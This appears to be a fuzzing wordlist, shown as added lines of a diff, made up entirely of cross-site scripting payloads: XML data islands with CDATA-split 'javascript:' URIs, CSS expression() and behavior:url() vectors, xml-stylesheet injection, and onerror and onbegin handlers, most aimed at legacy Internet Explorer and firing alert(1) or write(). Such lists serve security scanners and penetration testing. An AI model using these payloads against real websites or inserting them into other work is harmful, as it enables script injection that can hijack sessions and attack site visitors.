+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
+<xml id="kcf" src="%25(htc)s"></xml> <label dataformatas="html" datasrc="#kcf" datafld="payload"></label>
+<xml id="kcf" src="test.htc"></xml><label dataformatas="html" datasrc="#kcf" datafld="payload"></label>
+<xml id="X"><a><b><script>alert(1);</script>;</b></a></xml>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
+<xml onreadystatechange=alert(1)>
+<xml> <rect style="height:100%25;width:100%25" id="kcf" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>
+<xml src="javascript:alert(1);">
+<?xml-stylesheet href="javascript:alert(1)"?><root/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
+<?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>
+<xmp> <%25 </xmp> <img alt='%25></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%25' </script> %25>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>
+<x style="background:url('x&#1;;color:red;/*')">KCF</x>
+<x style="background:url('x[a];color:red;/*')">XXX</x>
+<x style=behavior:url(#default#time2) onbegin=alert(1)>
+<x style="behavior:url(%25(sct)s)">
+<x style="behavior:url(test.sct)">
+<x style=x:expression(alert(1))>
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
+X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
